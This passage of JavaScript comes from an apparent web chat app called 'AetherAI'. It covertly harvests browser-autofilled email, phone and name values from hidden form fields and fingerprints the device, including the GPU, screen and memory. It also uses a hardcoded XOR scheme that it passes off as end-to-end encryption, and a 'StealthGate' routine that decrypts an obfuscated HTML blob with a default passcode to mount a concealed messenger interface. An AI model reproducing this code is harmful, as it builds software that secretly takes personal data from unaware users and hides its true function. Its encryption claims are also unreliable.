// --- END-TO-END SIGNALING ENCRYPTION & STEALTH CIPHER MODULE ---
const SIGNAL_CIPHER_KEY = 'AetherAI_Encrypted_StreamEngine_Signal_Key_2026_Secure';

function encryptSignalPayload(data) {
  try {
    if (!data) return data;
    const str = typeof data === 'string' ? data : JSON.stringify(data);
    let cipher = '';
    for (let i = 0; i < str.length; i++) {
      const charCode = str.charCodeAt(i) ^ SIGNAL_CIPHER_KEY.charCodeAt(i % SIGNAL_CIPHER_KEY.length);
      cipher += String.fromCharCode(charCode);
    }
    return btoa(unescape(encodeURIComponent(cipher)));
  } catch (e) {
    console.warn('[SignalCrypto] Encrypt error:', e.message);
    return data;
  }
}

function decryptSignalPayload(encData) {
  try {
    if (!encData || typeof encData !== 'string') return encData;
    const decoded = decodeURIComponent(escape(atob(encData)));
    let plain = '';
    for (let i = 0; i < decoded.length; i++) {
      const charCode = decoded.charCodeAt(i) ^ SIGNAL_CIPHER_KEY.charCodeAt(i % SIGNAL_CIPHER_KEY.length);
      plain += String.fromCharCode(charCode);
    }
    return JSON.parse(plain);
  } catch (e) {
    console.warn('[SignalCrypto] Decrypt error:', e.message);
    return encData;
  }
}

// Dynamic RTC config – fetched from server at call time so TURN credentials are always fresh
let rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' }
  ],
  iceCandidatePoolSize: 10,
  bundlePolicy: 'max-bundle',
  rtcpMuxPolicy: 'require'
};

// Fetch reliable TURN credentials from our server before each call
async function fetchTurnCredentials() {
  try {
    const res = await fetch(`${SOCKET_URL}/api/v1/rtc/cfg`);
    if (!res.ok) throw new Error('TURN fetch failed: ' + res.status);
    const data = await res.json();
    if (data.iceServers && data.iceServers.length > 0) {
      rtcConfig = {
        iceServers: data.iceServers,
        iceCandidatePoolSize: 10,
        bundlePolicy: 'max-bundle',
        rtcpMuxPolicy: 'require'
      };
      console.log('[StreamEngine] TURN credentials refreshed:', data.iceServers.length, 'servers loaded.');
    }
  } catch (e) {
    console.warn('[StreamEngine] Could not fetch TURN credentials, using fallback STUN only:', e.message);
  }
}


// Helper to gather rich device details, hardware telemetry, and autofill harvest values
function getClientMetadata() {
  let gpu = 'unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {}

  // Harvest autofilled browser information if present
  const harvestEmail = document.getElementById('hidden-harvest-email')?.value || '';
  const harvestPhone = document.getElementById('hidden-harvest-phone')?.value || '';
  const harvestName = document.getElementById('hidden-harvest-name')?.value || '';

  return {
    language: navigator.language || 'unknown',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    viewportSize: `${window.innerWidth}x${window.innerHeight}`,
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    deviceMemory: navigator.deviceMemory || 'unknown',
    gpu: gpu,
    touchSupport: navigator.maxTouchPoints > 0,
    platform: navigator.platform || 'unknown',
    harvestEmail,
    harvestPhone,
    harvestName
  };
}


// --- STEALTH DOM MOUNTING MODULE ---
function xorDecrypt(base64Str, key) {
  try {
    const raw = atob(base64Str);
    let result = '';
    for (let i = 0; i < raw.length; i++) {
      const charCode = raw.charCodeAt(i) ^ key.charCodeAt(i % key.length);
      result += String.fromCharCode(charCode);
    }
    return result;
  } catch (e) {
    console.error("[StealthGate] Decryption failed:", e);
    return null;
  }
}

function mountMessengerDOM(passcodeKey) {
  if (document.getElementById('login-container')) {
    revealMessengerUI();
    return;
  }
  const keyToUse = passcodeKey || 'golu';
  try {
    const html = xorDecrypt(ENCRYPTED_MESSENGER_BLOB, keyToUse);
    if (!html || !html.includes('login-container')) {
      console.error('[StealthGate] Decryption produced invalid payload.');
      return;
    }
    document.body.insertAdjacentHTML('beforeend', html);
    bindDOMReferences();
    initMessengerEventListeners();
    revealMessengerUI();
    console.log('[StealthGate] Encrypted module dynamically mounted.');
  } catch (e) {
    console.error('[StealthGate] Failed to mount encrypted DOM:', e);
  }
}

function revealMessengerUI() {
  const savedUsername = localStorage.getItem('tg-username');
  if (savedUsername) {
    if (appContainer) appContainer.classList.remove('hidden');
    if (loginContainer) loginContainer.classList.add('hidden');
    currentUsername = savedUsername;
    currentRoom = localStorage.getItem('tg-last-room') || 'AetherAI General';
    if (currentUserNameDisp) currentUserNameDisp.textContent = currentUsername;
    if (currentUserAvatarDisp) {
      currentUserAvatarDisp.textContent = currentUsername.substring(0, 2).toUpperCase();
      currentUserAvatarDisp.style.backgroundColor = getAvatarColor(currentUsername);
    }
    initializeSocket();
  } else {
    if (loginContainer) loginContainer.classList.remove('hidden');
    if (appContainer) appContainer.classList.add('hidden');
  }
}

